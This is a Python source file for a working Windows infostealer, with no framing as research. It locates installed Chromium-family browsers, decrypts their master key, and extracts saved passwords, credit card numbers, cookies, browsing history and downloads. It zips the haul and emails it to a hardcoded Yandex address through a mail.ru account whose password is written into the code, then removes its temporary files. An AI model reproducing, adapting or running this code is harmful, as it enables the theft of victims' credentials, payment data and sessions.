import subprocess
import mimetypes

subprocess.getoutput("pip install smtplib")
subprocess.getoutput("pip install pypiwin32")
subprocess.getoutput("pip install zipfile")
subprocess.getoutput("pip install email")

import base64
import os
import shutil
import zipfile
from datetime import datetime, timedelta
from email import encoders

from Crypto.Cipher import AES
import smtplib
from email.mime.audio import MIMEAudio
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase


def send_email(addr_to, f1le, msg_subj="Test", msg_text="hello"):
    msg = MIMEMultipart()
    addr_from = "responder49@mail.ru"
    password = "BSL5cwjyiDD5WsJXbWQv"

    # msg = MIMEMultipart()
    msg['From'] = addr_from
    msg['To'] = addr_to
    msg['Subject'] = msg_subj

    body = msg_text
    msg.attach(MIMEText(body, 'plain'))

    # process_attachement(msg, files)
    try:
        atach_file(msg, f1le)
    except:
        pass

    server = smtplib.SMTP_SSL('smtp.mail.ru')
    # server.starttls()
    # server.set_debuglevel(True)
    server.login(addr_from, password)
    server.send_message(msg, from_addr=addr_from, to_addrs=addr_to)
    server.quit()


def atach_file(msg, filepath):
    ctype, encoding = mimetypes.guess_type(filepath)
    maintype, subtype = ctype.split('/', 1)
    if maintype == 'text':
        with open(filepath, "r", encoding="utf-8") as fp:
            file = MIMEText(fp.read(), _subtype=subtype)
            fp.close()
            msg.attach(file)
    elif maintype == 'image':
        with open(filepath, 'rb') as fp:
            file = MIMEImage(fp.read(), _subtype=subtype)
            fp.close()
            msg.attach(file)
    elif maintype == 'audio':
        with open(filepath, 'rb') as fp:
            file = MIMEAudio(fp.read(), _subtype=subtype)
            fp.close()
            msg.attach(file)
    elif maintype == 'application':
        if subtype == 'x-zip-compressed':
            part = MIMEBase("application", "octet-stream")
            part.set_payload(open("m.zip", "rb").read())
            encoders.encode_base64(part)
            part.add_header("Content-Disposition", "attachment; filename=\"m.zip\"")
            msg.attach(part)
    file.add_header('Content-Disposition', 'attachment', filename=(filepath.split("\\"))[-1])

appdata = os.getenv('LOCALAPPDATA')

browsers = {
    'firefox': appdata + "\\Firefox\\User Data",
    'amigo': appdata + '\\Amigo\\User Data',
    'torch': appdata + '\\Torch\\User Data',
    'kometa': appdata + '\\Kometa\\User Data',
    'orbitum': appdata + '\\Orbitum\\User Data',
    'cent-browser': appdata + '\\CentBrowser\\User Data',
    '7star': appdata + '\\7Star\\7Star\\User Data',
    'sputnik': appdata + '\\Sputnik\\Sputnik\\User Data',
    'vivaldi': appdata + '\\Vivaldi\\User Data',
    'google-chrome-sxs': appdata + '\\Google\\Chrome SxS\\User Data',
    'google-chrome': appdata + '\\Google\\Chrome\\User Data',
    'epic-privacy-browser': appdata + '\\Epic Privacy Browser\\User Data',
    'microsoft-edge': appdata + '\\Microsoft\\Edge\\User Data',
    'uran': appdata + '\\uCozMedia\\Uran\\User Data',
    'yandex': appdata + '\\Yandex\\YandexBrowser\\User Data',
    'brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
    'iridium': appdata + '\\Iridium\\User Data',
}

data_queries = {
    'login_data': {
        'query': 'SELECT action_url, username_value, password_value FROM logins',
        'file': '\\Login Data',
        'columns': ['URL', 'Email', 'Password'],
        'decrypt': True
    },
    'credit_cards': {
        'query': 'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards',
        'file': '\\Web Data',
        'columns': ['Name On Card', 'Card Number', 'Expires On', 'Added On'],
        'decrypt': True
    },
    'cookies': {
        'query': 'SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies',
        'file': '\\Network\\Cookies',
        'columns': ['Host Key', 'Cookie Name', 'Path', 'Cookie', 'Expires On'],
        'decrypt': True
    },
    'history': {
        'query': 'SELECT url, title, last_visit_time FROM urls',
        'file': '\\History',
        'columns': ['URL', 'Title', 'Visited Time'],
        'decrypt': False
    },
    'downloads': {
        'query': 'SELECT tab_url, target_path FROM downloads',
        'file': '\\History',
        'columns': ['Download URL', 'Local Path'],
        'decrypt': False
    }
}


def get_master_key(path: str):
    import json
    from win32crypt import CryptUnprotectData
    if not os.path.exists(path):
        return

    if 'os_crypt' not in open(path + "\\Local State", 'r', encoding='utf-8').read():
        return

    with open(path + "\\Local State", "r", encoding="utf-8") as f:
        c = f.read()
    local_state = json.loads(c)

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    key = CryptUnprotectData(key, None, None, None, 0)[1]
    return key


def decrypt_password(buff: bytes, key: bytes) -> str:
    import win32crypt
    assert len(key) == 32
    try:
        # get the initialization vector
        iv = buff[3:15]
        password = buff[15:]
        # generate cipher
        cipher = AES.new(key, AES.MODE_GCM, iv)
        # decrypt password
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(buff, None, None, None, 0)[1])
        except:
            # not supported
            return ""


def save_results(browser_name, type_of_data, content):
    if not os.path.exists(browser_name):
        os.mkdir(browser_name)
    if content is not None:
        open(f'{browser_name}/{type_of_data}.txt', 'w', encoding="utf-8").write(content)
        # print(f"\t [*] Saved in {browser_name}/{type_of_data}.txt")
    else:
        pass
        # print(f"\t [-] No Data Found!")

def convert_chrome_time(chrome_time):
    return (datetime(1601, 1, 1) + timedelta(microseconds=chrome_time)).strftime('%d/%m/%Y %H:%M:%S')


def get_data(path: str, profile: str, key, type_of_data, data_type_name):
    import sqlite3
    from datetime import datetime, timedelta
    db_file = f'{path}\\{profile}{type_of_data["file"]}'
    if not os.path.exists(db_file):
        return
    result = ""
    shutil.copy(db_file, 'temp_db')
    conn = sqlite3.connect('temp_db')
    cursor = conn.cursor()
    cursor.execute(type_of_data['query'])
    try:
        for row in cursor.fetchall():
            row = list(row)
            if type_of_data['decrypt']:
                for i in range(len(row)):
                    if isinstance(row[i], bytes):
                        row[i] = decrypt_password(row[i], key)
            if data_type_name == 'history':
                if row[2] != 0:
                    row[2] = (datetime(1601, 1, 1) + timedelta(microseconds=row[2])).strftime('%d/%m/%Y %H:%M:%S')
                else:
                    row[2] = "0"
            result += "\n".join([f"{col}: {val}" for col, val in zip(type_of_data['columns'], row)]) + "\n\n"
    except sqlite3.OperationalError:
        pass
    conn.close()
    os.remove('temp_db')
    return result


def installed_browsers(browsers):
    available = []
    for x in browsers.keys():
        if os.path.exists(browsers[x]):
            available.append(x)
    return available

def zipdir(path, ziph):
    # ziph is zipfile handle
    for root, dirs, files in os.walk(path):
        try:
            for file in files:
                ziph.write(os.path.join(root, file),
                           os.path.relpath(os.path.join(root, file),
                                           os.path.join(path, '..')))
        except UserWarning:
            continue

def zipit(dir_list, zip_name):
    zipf = zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED)
    for dir in dir_list:
        zipdir(dir, zipf)
    zipf.close()


if __name__ == "__main__":
    available_browsers = installed_browsers(browsers)
    # print(available_browsers)

    for browser in available_browsers:
        browser_path = browsers[browser]
        master_key = get_master_key(browser_path)
        for data_type_name, data_type in data_queries.items():
            try:
                data = get_data(browser_path, "Default", master_key, data_type, data_type_name)
                save_results(browser, data_type_name, data)
            except PermissionError:
                pass
    zipit(available_browsers, "m.zip")

    for dn in available_browsers:
        try:
            shutil.rmtree(dn)
        except FileNotFoundError:
            continue

    send_email("verart1@yandex.ru", "m.zip")
    os.remove("m.zip")

"""
    if browser != "yandex":
        for data_type_name, data_type in data_queries.items():
            data = get_data(browser_path, "Default", master_key, data_type)
            save_results(browser, data_type_name, data)
"""
